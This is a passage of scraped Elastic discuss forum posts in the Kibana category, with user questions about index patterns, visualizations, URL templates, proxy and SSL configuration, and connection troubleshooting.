    "date": "April 12, 2020, 3:05am April 12, 2020, 6:40am April 12, 2020, 7:59am April 12, 2020, 9:48am April 12, 2020, 10:36am April 13, 2020, 7:36am April 13, 2020, 8:44am April 13, 2020, 9:32am April 13, 2020, 9:36am",
    "body": "Hi.. I have a logstash index and already delete_by_query of the part of the indexes, and no more particular fields, then I've done to delete the index pattern to make sure the fields is clean. The strange behavior of the Kibana Index pattern is still have the fields that already removed in the index. Is it expected ? I'm using 7.6.2 Fadjar Tandabawana",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "02205f57-3f23-49e7-9161-40b6bb40f7af",
    "url": "https://discuss.elastic.co/t/stacked-column-chart-get-rid-of-all-docs/227620",
    "title": "Stacked column chart, get rid of \"All Docs\"",
    "category": [
      "Kibana"
    ],
    "author": "perfecto25",
    "date": "April 11, 2020, 4:39pm April 13, 2020, 8:02am",
    "body": "Hello, Im trying to create a stacked column chart showing CPU % usage per CPU core Im getting data from metric beat, \"system.core.id\" The chart looks ok but I cant figure out how to remove the \"All Docs\" labels on X axis, theres no option anywhere to remove that. I want X Axis to only show the CPU core ID number (% system and % user stacked column) How can I remove the \"all docs\" image1255×469 15.6 KB",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "e6026eb3-1470-4823-a4b8-03e6c4659b51",
    "url": "https://discuss.elastic.co/t/kibana-7-visualization-without-aggregation/227654",
    "title": "Kibana 7, Visualization without aggregation",
    "category": [
      "Kibana"
    ],
    "author": "agsilvio",
    "date": "April 12, 2020, 8:53am April 13, 2020, 7:59am",
    "body": "Hello, An age old question, but seemingly not asked for any recent version: Is there any way to have a visualization without aggregation? My goal: I have time series data in ES(7). The date is mapped as such and the Kibana index pattern recognizes it well. Each data point comes in every 10 seconds or so. I just want to see a line chart for one numeric value in the dataset, for each data point, shown by its time. Is that so much to ask?! (joking). Is there any way to achieve this in Kibana 7.6.1? Please and thank you.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "4ba2e003-8b02-4d5b-989b-7dfe25360be1",
    "url": "https://discuss.elastic.co/t/creating-a-report-dashboard-from-multiple-csv/226518",
    "title": "Creating a report Dashboard from Multiple CSV",
    "category": [
      "Kibana"
    ],
    "author": "NoobieDev",
    "date": "April 4, 2020, 2:51pm April 7, 2020, 8:02pm April 13, 2020, 7:43am",
    "body": "Hi all, I'm discovering ELS I've worked previously with Kibana only using Visualization. Today I'm looking to do something different. I have some CSV from a tool, I have 1 CSV per month to get some data from the previous month. I want to create something easy for the user to work with. Here is my idea. The user upload the CSV The user can the current month/year from a dashboard I will create. I know how to set the date (Thank you kibana you already make the job ). But how could I upload my futures uploads inside the same Kibna index ina easy way ? Is it possible ? If not any idea about how I could dal with it ? Thanks for your answer, and sorry for my low english.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "47083d23-7e41-40ed-9ace-c06c98b607a2",
    "url": "https://discuss.elastic.co/t/the-problem-with-the-url-link-click-to-open-the-txt-file-there-is-a-404-error/227447",
    "title": "The problem with the URL link. Click to open the .txt file. There is a 404 error",
    "category": [
      "Kibana"
    ],
    "author": "111207",
    "date": "April 10, 2020, 7:00am April 13, 2020, 6:20am April 13, 2020, 6:22am",
    "body": "I have fix the url template is /http://192.168.1.145/esdata/{{value}} my values is path of the file.txt I want to click to open that file If we clicking to the URL have an error 404 The Url auto insert \"%2F\" between directory and file name. link error880×560 20.9 KB urltemplate877×574 36.9 KB",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "4dc0c1df-e322-4bfb-8c6e-6d537dd249cc",
    "url": "https://discuss.elastic.co/t/kibana-readiness-probe-failed-get-https-5601-login-net-http-request-canceled-while-waiting-for-connection-client-timeout-exceeded-while-awaiting-headers/226877",
    "title": "Kibana Readiness probe failed: Get https://5601/login: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers)",
    "category": [
      "Kibana"
    ],
    "author": "kumar_kung",
    "date": "April 7, 2020, 11:08am April 8, 2020, 11:36pm April 13, 2020, 6:14am",
    "body": "Warning Unhealthy 3m21s kubelet, ip-10-24-196-234.ap-south-1.compute.internal Readiness probe failed: Get http://:5601/login: net/http: request canceled (Client.Timeout exceeded while awaiting headers) Warning Unhealthy 2m46s (x4 over 3m13s) kubelet, ip-10-24-196-234.ap-south-1.compute.internal Readiness probe failed: HTTP probe failed with statuscode: 503 ECK = 1.0.0 ga Cloud= EKS Kibana version : 7.5.2 Elasticsearch version : 7.5.2 EKS: 1.15",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "b87bd499-2c48-4934-bb18-67cbe3d5ee02",
    "url": "https://discuss.elastic.co/t/cannot-access-kibana-on-security-onion-remotely/227632",
    "title": "Cannot access Kibana on Security Onion remotely",
    "category": [
      "Kibana"
    ],
    "author": "englezakis",
    "date": "April 11, 2020, 7:37pm April 13, 2020, 5:34am",
    "body": "Hi. I got a Security Onion installed on a VM. I have Kibana access locally. However, using another VM in the same LAN, I cannot access Kibana. I have used so-allow in Security Onion. Also, in kibana.yml I have set, server.host: \"0.0.0.0\" Running curl i get the following: curl -v 10.1.4.124:5601 Expire in 0 ms for 6 (transfer 0x55611d8af5c0) Trying 10.1.4.124... TCP_NODELAY set Expire in 200 ms for 4 (transfer 0x55611d8af5c0) connect to 10.1.4.124 port 5601 failed: Connection refused Failed to connect to 10.1.4.124 port 5601: Connection refused Closing connection 0 curl: (7) Failed to connect to 10.1.4.124 port 5601: Connection refused Any suggestions are welcome. Thanks",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "01715177-4409-4158-9ab9-6d21a8ba2b19",
    "url": "https://discuss.elastic.co/t/hi-i-set-elastic-user-password-an-not-able-to-connect-to-kibana/227605",
    "title": "Hi I set elastic user password an not able to connect to Kibana?",
    "category": [
      "Kibana"
    ],
    "author": "kartheek91",
    "date": "April 11, 2020, 1:56pm April 13, 2020, 5:23am",
    "body": "Hi I have added elastic user password and changed in Kibana.yml file then restarted elasticsearch as well as kibana service.I'm not able to connect Kibana. image1920×1080 186 KB and in console of the chrome browser I'm getting this error GET http://0.0.0.0:5601/favicon.ico 503 (Service Unavailable)",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "2e75af1d-81fb-41b4-a9bf-5f7ae93958dd",
    "url": "https://discuss.elastic.co/t/dashboard-stack-setup/227701",
    "title": "Dashboard Stack Setup",
    "category": [
      "Kibana"
    ],
    "author": "xennn",
    "date": "April 12, 2020, 8:06pm April 13, 2020, 5:12am",
    "body": "Hi there, I have a stack installation. My file beat forwards the beats to my logstash. But i have a problem i cant use the dashboard command for setup the dashboards. I found a way in documentation to use the api for this.But i get a error. {\"objects\":[{\"id\":\"a1da8500-f739-11e9-9f4d-5dd1f9c9e483\",\"type\":\"dashboard\",\"error\":{\"message\":\"failed to parse field [dashboard.panelsJSON] of type [text] in document with id 'dashboard:a1da8500-f739-11e9-9f4d-5dd1f9c9e483'. Preview of field's value: Over the GUI i get a error message: Sorry, there was an error Saved objects file format is invalid and cannot be imported. How i can solve this? What is the best practice for this setup with a stack and dont use all services on one server.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "f76985c3-e846-4b5a-b38c-c6e06bc0b35b",
    "url": "https://discuss.elastic.co/t/making-api-calls-from-kibana-in-realtime/227625",
    "title": "Making API calls from Kibana in realtime",
    "category": [
      "Kibana"
    ],
    "author": "sminnakanti",
    "date": "April 11, 2020, 6:20pm April 11, 2020, 11:26pm April 12, 2020, 12:42am April 12, 2020, 2:34pm April 13, 2020, 1:14am April 13, 2020, 1:31am April 13, 2020, 2:27am",
    "body": "Hello, Hope everyone is doing great! This is Sri, i just started exploring ELK stack. I've following requirement, hope i can get inputs from the ELK experts on this. I'm working on the real time dashboard in Kibana. I've processes running on different tools/technologies [One of the example is jobs running in ETL] and the jobs are running 24/7. One of the requirement for my dashboard is to show the processes currently running on these different tools in real time. We have API's available from every tool to get the list of current running jobs. Now i need to call these API's to show the current running jobs in Kibana dashboard whenever user accessing the dashboard. Would it be possible to make call to external API's from Kibana in real time while accessing dashboard and show the response of these API's in the dashboard? If yes, can you please provide details how to implement this? Appreciate your help! Thanks, Sri",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "1e73156b-21a8-4785-8676-ffcaeafd9761",
    "url": "https://discuss.elastic.co/t/looking-for-kibana-demo-video/227231",
    "title": "Looking for Kibana Demo video",
    "category": [
      "Kibana"
    ],
    "author": "andrew_vo",
    "date": "April 9, 2020, 4:14am April 10, 2020, 10:40pm April 11, 2020, 2:55am",
    "body": "Hi. I saw an elasticsearch kibana video few days ago. In the video, CTO or Engineer of a company I forgot the name, he introduces his elasticsearch dashboard that he built, it can convert nature language questions into queries and immediately show the chart result for his question which is very clean and effective, very impress. I'm trying to watch it again but can not found it. I have try to find on Elastic Youtube Channel but not found. Did you watch it? I really want to watch it again...I hope you guys can help. *If I post this in the wrong place, please let me know where I should post it.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "4eec5bf7-5d8a-403b-b03e-d1f2c7686b71",
    "url": "https://discuss.elastic.co/t/kibana-is-not-loading-and-resulting-in-timeout/226978",
    "title": "Kibana is not loading and resulting in timeout",
    "category": [
      "Kibana"
    ],
    "author": "Daud_Ahmed",
    "date": "April 7, 2020, 6:22pm April 10, 2020, 10:57pm",
    "body": "hi, {\"type\":\"log\",\"@timestamp\":\"2020-04-07T17:20:25Z\",\"tags\":[\"info\",\"optimize\"],\"pid\":8025,\"message\":\"Optimizing and caching bundles for core, graph, monnitoring, space_selector, login, overwritten_session, logout, logged_out, ml, dashboardViewer, apm, maps, canvas, infra, siem, uptime,:8025,\"message\":\"Optimizing and caching bundles for core, graph, monitoring, space_selector, login, overwritten_session, logout, logged_out, ml, dashboardViewer, apm, maps, canvas, infra, siem, uptime, d_out, ml, dashboardViewer, apm, maps, canvas, infra, siem, uptime, lens, wazuh, kibana, stateSessionStorageRedirect, status_page and lens, wazuh, kibana, stateSessionStorageRedirect, status_page and timelion. This may take a few minutes\"} This is what i'm getting at the last line when i give 'journalctl -u kibana' when i send request via curl or use browser it results in timeout i even wait for almost an hour but still it's not responding can anyone help me with this.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "2ef42187-21c6-4fda-acbe-6b7a095e4109",
    "url": "https://discuss.elastic.co/t/custom-bar-visualization-in-kibana/227062",
    "title": "Custom bar visualization in kibana",
    "category": [
      "Kibana"
    ],
    "author": "Lokesh_Mutra",
    "date": "April 8, 2020, 7:15am April 10, 2020, 10:56pm",
    "body": "i want to visualize the data which is in different \" _id\" something like this field name is level_1.words: _id : 1 _index :training level_1.words : [ {\"happy\":[{\"total\":30,\"today\":10,\"before_day\":20}],\"sad\":[{\"total\":30,\"today\":10,\"before_day\":20}]}]",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "a61fe06d-4898-42ec-b66c-b54751135cb4",
    "url": "https://discuss.elastic.co/t/weird-behavior-with-show-partial-rows-in-data-table/227079",
    "title": "Weird behavior with \"Show partial rows\" in data table",
    "category": [
      "Kibana"
    ],
    "author": "Rom1",
    "date": "April 8, 2020, 8:17am April 10, 2020, 10:47pm",
    "body": "Dear all, I'm using Kibana 7.5.1 and I'm facing weird behavior when using datatable visualization: When I activate \"Show partial rows\", it seems that the 'Formatted' export is disabled (nothing happens when I click on this action, only 'Raw' export is possible) When I activate \"Show partial rows\" and I export 'Raw' data, metrics fields are added in the result file (there are not displayed in the visualization). Column names alternate \"Name1\", \"count\", \"Name2\", \"count\", .... but metrics values are in columns after the data Data table Name1, Name2 Foo, Bar Export Name1, count, Name2, count Foo, Bar, 1, 1 Thank you for your help",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "07f0826d-8a80-4a82-b610-2ab0823a3354",
    "url": "https://discuss.elastic.co/t/how-to-change-the-sankey-diagram-colors/227229",
    "title": "How to change the Sankey diagram colors?",
    "category": [
      "Kibana"
    ],
    "author": "Krishna94",
    "date": "April 9, 2020, 3:44am April 10, 2020, 10:44pm",
    "body": "Hello Team, We use a dark theme and I want to set other light colors for the 3 -node Sankey diagram. I followed the example for the Sankey Diagram from the Elastic Blog Post [ Kibana/Vega Sankey Post. ] . Please help.! Thanks.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "ae928a84-85d5-4dde-9847-e78f94eaf12c",
    "url": "https://discuss.elastic.co/t/prevent-saved-search-to-filter-the-dashboard/226236",
    "title": "Prevent saved search to filter the dashboard",
    "category": [
      "Kibana"
    ],
    "author": "liorg2",
    "date": "April 2, 2020, 3:09pm April 3, 2020, 4:54am April 3, 2020, 9:27am April 3, 2020, 4:50pm April 10, 2020, 9:33pm",
    "body": "hello, Is it possible to add a saved search to a dashboard, without these buttons, or not to allow them to filter the whole page? thanks",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "5134ea13-e702-41a7-8149-83980822c650",
    "url": "https://discuss.elastic.co/t/internal-server-error-after-update/226430",
    "title": "Internal Server Error After Update",
    "category": [
      "Kibana"
    ],
    "author": "wingdom",
    "date": "April 3, 2020, 3:28pm April 6, 2020, 8:20pm April 7, 2020, 2:55pm April 10, 2020, 7:43pm",
    "body": "Hello, I updated to 7.6.2 today, and am now greeted with the following error: Version: 7.6.2 Build: 29199 Error: Internal Server Error at fetchResponse$ (http://fluent.dev.brandcoders.com/bundles/commons.bundle.js:3:3009775) at s (http://fluent.dev.brandcoders.com/bundles/kbn-ui-shared-deps/kbn-ui-shared-deps.js:338:774550) at Generator._invoke (http://fluent.dev.brandcoders.com/bundles/kbn-ui-shared-deps/kbn-ui-shared-deps.js:338:774303) at Generator.forEach.e.<computed> [as next] (http://fluent.dev.brandcoders.com/bundles/kbn-ui-shared-deps/kbn-ui-shared-deps.js:338:774907) at s (http://fluent.dev.brandcoders.com/bundles/kbn-ui-shared-deps/kbn-ui-shared-deps.js:338:774550) at t (http://fluent.dev.brandcoders.com/bundles/kbn-ui-shared-deps/kbn-ui-shared-deps.js:338:775045) at http://fluent.dev.brandcoders.com/bundles/kbn-ui-shared-deps/kbn-ui-shared-deps.js:338:775195 I did some searching and found this github issue. My situation is basically the same, I am behind an apache proxy, but my ProxyPath is just for /, not each route individually. Apache Config <VirtualHost _default_:443> SSLProxyEngine on SSLProxyVerify none SSLProxyCheckPeerCN off SSLProxyCheckPeerName off SSLProxyCheckPeerExpire off #SSLEngine On ProxyPass / https://localhost:5601/ connectiontimeout=900 timeout=900 ProxyPassReverse / https://localhost:5601/ SetEnv force-proxy-request-1.0 1 SetEnv proxy-nokeepalive 1 Kibana Config (yes, basePath is commented out, which means it should default to /app/kibana, right?) server.host: \"0.0.0.0\" #server.basePath: \"\" #server.rewriteBasePath: false",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "ca1edf08-20f7-4483-a387-3dd7e3b52184",
    "url": "https://discuss.elastic.co/t/tsvb-table-does-not-remember-sort-column-unless-you-click-on-it/227546",
    "title": "TSVB Table does not remember Sort Column unless you click on it",
    "category": [
      "Kibana"
    ],
    "author": "qualispec",
    "date": "April 10, 2020, 6:39pm April 10, 2020, 7:25pm April 10, 2020, 7:34pm April 10, 2020, 7:40pm",
    "body": "I'm using Kibana 7.5.0. I'm working on a TSVB Table, where my Group by field is a date field (with mapping \"type\" : \"date\"). That date field is displaying in the TSVB Table with format like \"Apr 9, 2020 @ 00:00:00.000\". When in the Visualize editor, when I click on the date field column header (and see the up and down arrow), the column does successfully sort (both ascending or descending). If I then Save, and reload the Visualize editor, that date field is no longer sorted properly (seems to be in random order). I found the following open tickets in Github, but none are resolved yet: https://github.com/elastic/kibana/issues/51888 https://github.com/elastic/kibana/issues/49626 (slightly different issue that is also affecting me) Can anyone confirm they are seeing this issue? Are there any known workarounds? These sorting issues in the TSVB Table make it almost unusable for end users (if they don't know that they have to manually sort the column, they could misinterpret the results). Thank you.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "b8d2ce91-4ba8-4a08-9532-b2631cc3cd33",
    "url": "https://discuss.elastic.co/t/exporting-a-saved-search-to-json-file/227543",
    "title": "Exporting a saved search to JSON file",
    "category": [
      "Kibana"
    ],
    "author": "soffonisol",
    "date": "April 10, 2020, 6:23pm April 10, 2020, 7:21pm April 10, 2020, 7:33pm",
    "body": "I have seen many articles that instructs us to go to management -> Saved Object -> export from there. However, when I examine the exported JSON, it's completely different than my saved search results. Do you know why that is? or is there another method of exporting to JSON that accurately shows the saved search in one file.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "8cefcf95-666e-4cc3-9020-5f799db69353",
    "url": "https://discuss.elastic.co/t/watcher-condition-with-aggregation/225758",
    "title": "Watcher condition with aggregation",
    "category": [
      "Kibana"
    ],
    "author": "",
    "date": "March 30, 2020, 11:55pm March 31, 2020, 5:53pm March 31, 2020, 6:12pm April 10, 2020, 5:34pm",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "dd738f22-55f1-4049-bfac-d24b17ee4acf",
    "url": "https://discuss.elastic.co/t/is-kibana-right-tool-to-create-multi-facet-search-user-interface/227406",
    "title": "Is Kibana right tool to create multi-facet search user interface",
    "category": [
      "Kibana"
    ],
    "author": "kevinzou",
    "date": "April 9, 2020, 8:50pm April 10, 2020, 12:52pm April 10, 2020, 4:04pm",
    "body": "Sorry for the dumb question but I am completely new in the elastic world. I would like to develop a quick proof of concept to demo elastic functionalities. and the typical multifacet interface would be perfect for me. I don't want to spend time in javascript to develop a web front end. I am wondering if I can use Kibana to develop such kind of interface. i.e. the facet catalog in left side with search bar and result in the middle of the page.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "d1044dad-e932-4da9-b84a-fad002b40e69",
    "url": "https://discuss.elastic.co/t/how-to-make-a-hypertext-link-in-datatable-without-custom-formatter/227404",
    "title": "How to make a hypertext link in datatable without custom formatter",
    "category": [
      "Kibana"
    ],
    "author": "Goishin",
    "date": "April 9, 2020, 8:18pm April 10, 2020, 4:02pm April 10, 2020, 4:02pm",
    "body": "I currently have a field in my index that uses a custom formatter. I use this to go to the dashboard associated with that field. You start in one dashboard, there's a list of instances, you click on one of the instances, and it takes you to the dashboard for that instance. However, that field also represents something in my company's internal network. You can take that field and stick it in an url and it goes to the relevant internal page about that instance. I now want to create a link to that internal page. The problem is that I can't use the custom formatting tools to take you there because it is already in use to take you to the kibana dashboard. Not the internal page. I created a small script in a datatable to format that field into the correct url that takes you to the internal page on my corp network. It just isn't clickable. Is there something I can do in the script, or the datatable controls, that would change that text to a hyperlink? I tried using markdown, but datatable visualizations don't seem to respect that. And I don't know how to make a markdown visualization that can use field data from a document. How do I work this out?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "49dcbea4-9b3a-40df-9e03-4c615f6b5e2f",
    "url": "https://discuss.elastic.co/t/kibana-free-authentication/227497",
    "title": "Kibana free authentication",
    "category": [
      "Kibana"
    ],
    "author": "d.silwon",
    "date": "April 10, 2020, 12:56pm April 10, 2020, 1:07pm April 10, 2020, 1:26pm April 10, 2020, 1:33pm April 10, 2020, 2:09pm April 10, 2020, 2:21pm April 10, 2020, 2:24pm April 10, 2020, 2:48pm April 10, 2020, 2:42pm April 10, 2020, 2:47pm",
    "body": "Dears, Is there any option to configure Kibana (ELK 7.6.2) free authentication without x-pack? Best Regads, d",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "1daed8e9-a15d-43d6-915d-ad6f4378e411",
    "url": "https://discuss.elastic.co/t/kibana-json-input-calc-fields/227501",
    "title": "Kibana JSON input calc fields",
    "category": [
      "Kibana"
    ],
    "author": "Robin020",
    "date": "April 10, 2020, 12:39pm April 10, 2020, 1:05pm",
    "body": "Hi, I use heartbeat for monitoring some url's. But unfortunately the resolving of my VPS is slow. So I would like to exclude the resolve.rtt.us field in a visualization. In the visualization I use the monitor.duration.us field on the Y as. I try to do this calculation: monitor.duration.us - resolve.rtt.us. {\"script\" : \"doc['monitor.duration.us'].value - doc['resolve.rtt.us'].value\"} Above JSON input doesn't work. Could somebody help me with this? Best regards, Robin",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "2e3ceefd-3f84-4b3b-936a-be07351f5317",
    "url": "https://discuss.elastic.co/t/analyzing-network-packets-with-wireshark-elasticsearch-and-kibana/227482",
    "title": "Analyzing network packets with Wireshark, Elasticsearch, and Kibana",
    "category": [
      "Kibana"
    ],
    "author": "elify",
    "date": "April 10, 2020, 10:43am April 10, 2020, 1:00pm",
    "body": "Elastic Blog – 16 Aug 17 Analyzing network packets with Wireshark, Elasticsearch, and Kibana Learn how to architect a real-time data pipeline for network packet analysis using Wireshark, Filebeat, Logstash, Ingest Pipelines, Elasticsearch, and Kibana. Hello, I tried this document. I got some mistakes. Firtstly, I tried mapping in document. Screenshot_1546×591 8.08 KB Then I got this error; { \"error\" : { \"root_cause\" : [ { \"type\" : \"mapper_parsing_exception\", \"reason\" : \"Root mapping definition has unsupported parameters: [pcap_file : {dynamic=false, properties={layers={properties={udp={properties={udp_udp_srcport={type=integer}, udp_udp_dstport={type=integer}}}, ip={properties={ip_ip_src={type=ip}, ip_ip_dst={type=ip}}}, frame={properties={frame_frame_len={type=long}, frame_frame_protocols={type=keyword}}}}}, timestamp={type=date}}}]\" } ], \"type\" : \"mapper_parsing_exception\", \"reason\" : \"Failed to parse mapping [_doc]: Root mapping definition has unsupported parameters: [pcap_file : {dynamic=false, properties={layers={properties={udp={properties={udp_udp_srcport={type=integer}, udp_udp_dstport={type=integer}}}, ip={properties={ip_ip_src={type=ip}, ip_ip_dst={type=ip}}}, frame={properties={frame_frame_len={type=long}, frame_frame_protocols={type=keyword}}}}}, timestamp={type=date}}}]\", \"caused_by\" : { \"type\" : \"mapper_parsing_exception\", \"reason\" : \"Root mapping definition has unsupported parameters: [pcap_file : {dynamic=false, properties={layers={properties={udp={properties={udp_udp_srcport={type=integer}, udp_udp_dstport={type=integer}}}, ip={properties={ip_ip_src={type=ip}, ip_ip_dst={type=ip}}}, frame={properties={frame_frame_len={type=long}, frame_frame_protocols={type=keyword}}}}}, timestamp={type=date}}}]\" } }, \"status\" : 400 } After I tried curl part Screenshot_2988×114 13.6 KB I solved these errors like this; Screenshot_3933×92 5.38 KB This caused other problems. How can I solve?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "5fa571d9-c200-479f-a3df-e9a0fdb801b4",
    "url": "https://discuss.elastic.co/t/create-a-search-link-using-the-kibana-uri/227360",
    "title": "Create a Search Link using the Kibana URI",
    "category": [
      "Kibana"
    ],
    "author": "olatunde.tokun",
    "date": "April 9, 2020, 3:46pm April 10, 2020, 12:11pm",
    "body": "Hello, My users access data through Kibana. I want to know if its possible to search directly using the Kibana URI. Kibana URI: https://mykibana.com Search String: \"event.severity: high\" Trying to created a search link for my users (this doesnt work for me, error code: 404): https://mykibana.com/_search?q=\"event.severity: high\" Please let me know if you have suggestions.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "3583aa98-98da-4789-a9b2-a9ceb0c83069",
    "url": "https://discuss.elastic.co/t/automation-anywhere-bots-logs-visualisation-using-kibana/227296",
    "title": "Automation Anywhere BOTS Logs Visualisation using KIbana",
    "category": [
      "Kibana"
    ],
    "author": "hem_sai_chand",
    "date": "April 9, 2020, 10:19am April 10, 2020, 11:59am",
    "body": "Hello techies, We would like to visualize our Automation anywehere bots using Kibana. Bots usually generates different types of logs with good amount of information. This could be a great oppurtunity for me disscuss and share things over here. We have a successful mode in Uipath RPA but not for Automation ANywhere. Would like to hear from all of you.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "90a17a72-04ab-48f5-8152-11981b527370",
    "url": "https://discuss.elastic.co/t/uanble-to-view-kibana-dashboard-localhost-not-working/227241",
    "title": "Uanble to view Kibana dashboard localhost not working",
    "category": [
      "Kibana"
    ],
    "author": "pat3526",
    "date": "April 9, 2020, 5:44am April 10, 2020, 11:46am",
    "body": "elasticsearch1034×1096 130 KB Kibana1340×1081 215 KB I have a practice machine to try out the software. I'm unable to view the Kibana dashboard using http://localhost:5601/. I am running Centos 7 and have Elasticsearch and Kibana currently running, started and I am able to ping my IP-address on my interface and localhost. I added my IP address to the hosts' file also. What am I missing?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "090c487d-2d56-49e1-9f88-54340361f1d0",
    "url": "https://discuss.elastic.co/t/kibana-throws-errors-after-ssl-configuration-in-configmap-kibana-yml/224639",
    "title": "Kibana throws errors after SSl configuration in configmap kibana.yml",
    "category": [
      "Kibana"
    ],
    "author": "Abu84",
    "date": "March 23, 2020, 10:02am March 23, 2020, 1:29pm March 23, 2020, 2:30pm March 23, 2020, 2:36pm March 23, 2020, 3:24pm March 23, 2020, 5:25pm March 24, 2020, 5:44am March 24, 2020, 6:19am March 24, 2020, 9:40am March 24, 2020, 5:30pm March 24, 2020, 6:05pm March 26, 2020, 6:37am March 26, 2020, 6:45am March 26, 2020, 4:47pm March 27, 2020, 8:53am April 9, 2020, 6:04am April 10, 2020, 8:57am",
    "body": "Continuing the discussion from Kibana logging errors after SSl configuration: here is my configuration. This is my complete kibana.yml configuration. server.host: \"0.0.0.0\" elasticsearch.hosts: [\"http://localhost:9200\"] server.ssl.enabled: true server.ssl.certificate: /cert/test.crt server.ssl.key: /cert/test.key",
    "website_area": "discuss",
    "replies": 17
  },
  {
    "id": "d4e18ff3-838d-46f9-92a9-66bc6ba2286d",
    "url": "https://discuss.elastic.co/t/how-to-fix-url-template-in-string-field-type-url/226838",
    "title": "How to fix URL template in string field type URL",
    "category": [
      "Kibana"
    ],
    "author": "111207",
    "date": "April 7, 2020, 7:15am April 7, 2020, 12:05pm April 8, 2020, 4:22am April 10, 2020, 5:11am",
    "body": "Hi Elastic team I 'm using FSCrewler to Import data to elasticsearch and I change string field name path.virtual to Link URL. I need to click to access into the file. How to fix the URL template it Filename es.txt link879×118 8.69 KB settingURL749×530 31.3 KB path: http://192.168.1.145/esdata/doc/es.txt URL: template:http://192.168.1.145/esdata/{{value}} http://192.168.1.145/esdata/%2Fdoc%2Fes.txt",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "591eb226-8851-4cc9-86ff-6777e868d57d",
    "url": "https://discuss.elastic.co/t/embedding-kibana-dashboard-7-3-1/224731",
    "title": "Embedding Kibana dashboard (7.3.1)",
    "category": [
      "Kibana"
    ],
    "author": "jhaajit",
    "date": "March 23, 2020, 8:34pm March 24, 2020, 12:36pm April 9, 2020, 8:53pm",
    "body": "Hello, I embedded a Kibana (7.3.1) dashboard with full screen mode using IFrame. However, I want to display the Search bar (KQL) as well. Please help, if it is possible. Thanks, Ajit",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "997165e0-ebc3-4e8e-8ae5-35af14a01c93",
    "url": "https://discuss.elastic.co/t/not-able-to-connect-to-kibana-from-any-ip-other-than-localhost-loopback-address/227207",
    "title": "Not able to connect to Kibana from any IP other than localhost loopback address",
    "category": [
      "Kibana"
    ],
    "author": "mneely",
    "date": "April 8, 2020, 9:01pm April 9, 2020, 6:36am April 9, 2020, 6:31am April 9, 2020, 6:35am April 9, 2020, 6:38am April 9, 2020, 6:44am April 9, 2020, 6:59am April 9, 2020, 7:57pm April 9, 2020, 4:14pm April 9, 2020, 7:57pm April 9, 2020, 7:57pm",
    "body": "Hello, I am able to connect to http://localhost:5601 on my ubuntu 18.04 machine that is running docker and the ELK stack, but not able to connect to my Ethernet IP. mneely@umbrella-kibana:~$ curl -i http://localhost:5601 HTTP/1.1 302 Found location: /app/kibana kbn-name: kibana kbn-xpack-sig: 6ac3af7a9155783217983f0fb9fc6b6b content-type: text/html; charset=utf-8 cache-control: no-cache content-length: 0 connection: close Date: Wed, 08 Apr 2020 20:28:23 GMT mneely@umbrella-kibana:~ curl -i http://172.18.3.253:5601 curl: (7) Failed to connect to 172.18.3.253 port 5601: Connection refused mneely@umbrella-kibana:~ mneely@umbrella-kibana:~$ ifconfig > docker0: flags=4099<UP,BROADCAST,MULTICAST> mtu 1500 > inet 172.17.0.1 netmask 255.255.0.0 broadcast 172.17.255.255 > ether 02:42:bb:9e:ff:dd txqueuelen 0 (Ethernet) > RX packets 0 bytes 0 (0.0 B) > RX errors 0 dropped 0 overruns 0 frame 0 > TX packets 0 bytes 0 (0.0 B) > TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 > > ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500 > inet 172.18.3.253 netmask 255.255.252.0 broadcast 172.18.3.255 > inet6 fe80::250:56ff:feb2:d86b prefixlen 64 scopeid 0x20 > ether 00:50:56:b2:d8:6b txqueuelen 1000 (Ethernet) > RX packets 64435 bytes 90229013 (90.2 MB) > RX errors 0 dropped 0 overruns 0 frame 0 > TX packets 21423 bytes 1712637 (1.7 MB) > TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 > > flannel.1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1450 > inet 10.1.66.0 netmask 255.255.255.255 broadcast 0.0.0.0 > inet6 fe80::c822:9ff:fe93:90b prefixlen 64 scopeid 0x20 > ether ca:22:09:93:09:0b txqueuelen 0 (Ethernet) > RX packets 0 bytes 0 (0.0 B) > RX errors 0 dropped 0 overruns 0 frame 0 > TX packets 0 bytes 0 (0.0 B) > TX errors 0 dropped 14 overruns 0 carrier 0 collisions 0 > > lo: flags=73<UP,LOOPBACK,RUNNING> mtu 65536 > inet 127.0.0.1 netmask 255.0.0.0' --- ## Default Kibana configuration from kibana-docker. ## from https://github.com/elastic/kibana-docker/blob/master/build/kibana/config/kibana.yml # server.name: kibana server.host: \"0.0.0.0\" elasticsearch.url: http://localhost:9200 server.port: 5601 logging.dest: /var/log/kibana/kibana.log mneely@umbrella-kibana:~$ sudo ufw status Status: 